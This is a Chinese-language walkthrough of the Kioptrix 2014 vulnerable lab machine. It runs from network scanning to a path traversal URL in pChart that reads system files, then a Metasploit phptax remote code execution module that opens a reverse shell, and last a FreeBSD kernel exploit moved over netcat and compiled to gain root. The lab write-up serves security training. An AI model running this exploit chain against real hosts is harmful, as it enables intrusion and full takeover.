将靶机和kali攻击机放在同一个网段

### 信息探测
用户`arp-scan 192.168.159.0/24`发现主机IP为192.168.159.133

#### 端口扫描
```
$ nmap -sT -sV -p 1-65535 192.168.159.0/24
host             port  proto  name  state   info
----             ----  -----  ----  -----   ----
192.168.159.133  22    tcp    ssh   closed  
192.168.159.133  80    tcp    http  open    Apache httpd 2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
192.168.159.133  8080  tcp    http  open    Apache httpd 2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
```

#### web探测
目录探测两个web服务没有发现什么内容，直接访问，发现80端口的web服务主页有路径信息
```
<head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
</head>
```

访问发现一个复杂的应用


#### 漏洞分析
mod_ssl存在漏洞，和kioptrix level 1一样，但是EXP在最新版编译不成功，老版Ubuntu可以，但是kali上仍然不可以用，有依赖问题，只能在老版本ubuntu上用，太麻烦了，试试有没有其他方式

web页面应该可以发现很多漏洞吧

### 漏洞利用
web接口很快就扫描出了任意文件读取漏洞`http://192.168.159.133/pChart2.1.3/examples/imageMap/index.php?Action=ViewPHP&Script=%2f..%2f../etc/passwd`

通过访问`http://192.168.159.133/pChart2.1.3/examples/imageMap/index.php?Action=ViewPHP&Script=%2f..%2f../var/log/httpd-error.log`可以得到路径`/usr/local/etc/apache22/httpd.conf`

访问路径后搜索，可以得到如下内容

```
<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>
```

8080端口设置为Mozilla4的浏览器才可以访问

使用BurpSuite，把包的User-Agent改成Mozilla4，访问得到phptax的信息

直接用msf和searchsploit尝试能不能利用

```
msf5 > search phptax

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   1  exploit/multi/http/phptax_exec  2012-10-08       excellent  Yes    PhpTax pfilez Parameter Exec Remote Code Injection


msf5 > use exploit/multi/http/phptax_exec
msf5 exploit(multi/http/phptax_exec) > set RHOSTS 192.168.159.133
RHOSTS => 192.168.159.133
msf5 exploit(multi/http/phptax_exec) > set RPORT 8080
RPORT => 8080
msf5 exploit(multi/http/phptax_exec) > options

Module options (exploit/multi/http/phptax_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.159.133  yes       The target address range or CIDR identifier
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   PhpTax 0.8


msf5 exploit(multi/http/phptax_exec) > run

[*] Started reverse TCP double handler on 192.168.159.128:4444 
[*] 192.168.159.1338080 - Sending request...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo CNuGojWxfYDfippn;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Command: echo ZjLBbjOR9KOyZPCI;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "CNuGojWxfYDfippn\r\n"
[*] Matching...
[*] A is input...
[*] Reading from socket B
[*] B: "ZjLBbjOR9KOyZPCI\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.159.128:4444 -> 192.168.159.133:21845) at 2019-09-29 14:58:09 +0800
[*] Command shell session 2 opened (192.168.159.128:4444 -> 192.168.159.133:51615) at 2019-09-29 14:58:09 +0800

whoami
www
```

可以直接远程命令执行

### 后渗透利用
```
$ uname -a 
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

查看对应操作系统版本是否有提权漏洞
```
$ searchsploit freebsd 9.0 local
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation                                                       | exploits/freebsd/local/28718.c
FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation                                                 | exploits/freebsd/local/26368.c
```

kali机器上
```
root@kali:~# cp /usr/share/exploitdb/exploits/freebsd/local/28718.c .
root@kali:~# nc -lvp 4444 < 28718.c
listening on [any] 4444 ...
Warning: forward host lookup failed for bogon: Unknown host
connect to [192.168.159.128] from bogon [192.168.159.133] 42275
```

目标机器上
```
$ nc -nv 192.168.159.128 > 28718.c
$ gcc -o sysert 28718.c
$ ./sysret
[+] SYSRET FUCKUP!!
[+] Start Engine...
[+] Crotz...
[+] Crotz...
[+] Crotz...
[+] Woohoo!!!
whoami
root
```

在/root目录下有作者的恭喜过关文件

### 其他
获取8080的用户权限后，可以看到/data目录，访问pdf路径，可以看到很多类似shell的命令，怀疑是有后门，不会利用
